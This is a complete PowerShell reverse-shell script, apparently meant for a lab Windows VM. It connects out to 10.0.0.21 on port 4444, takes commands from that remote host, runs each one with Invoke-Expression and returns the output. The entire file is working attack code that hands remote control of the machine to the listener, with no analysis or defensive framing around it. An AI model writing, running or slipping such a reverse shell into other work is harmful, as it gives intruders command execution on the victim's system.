# Remote Shell Connection Script
# Run this from PowerShell on the Windows VM

$HostIP = "10.0.0.21"
$Port = 4444

Write-Host "Connecting to $HostIP`:$Port..." -ForegroundColor Cyan

try {
    $client = New-Object System.Net.Sockets.TCPClient($HostIP, $Port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true

    # Send initial greeting
    $writer.WriteLine("=== Connected from $(hostname) ===")
    $writer.WriteLine("Ready for commands. Type 'exit' to disconnect.")

    while ($client.Connected) {
        # Show prompt
        $writer.Write("PS $PWD> ")

        # Read command from remote
        $command = $reader.ReadLine()

        if ($null -eq $command -or $command -eq "exit") {
            Write-Host "Disconnecting..." -ForegroundColor Yellow
            break
        }

        # Execute command and send output
        try {
            $output = Invoke-Expression $command 2>&1 | Out-String
            if ($output) {
                $writer.WriteLine($output)
            } else {
                $writer.WriteLine("[No output]")
            }
        }
        catch {
            $writer.WriteLine("ERROR: $_")
        }
    }
}
catch {
    Write-Host "Connection failed: $_" -ForegroundColor Red
}
finally {
    if ($client) { $client.Close() }
    Write-Host "Connection closed." -ForegroundColor Yellow
}
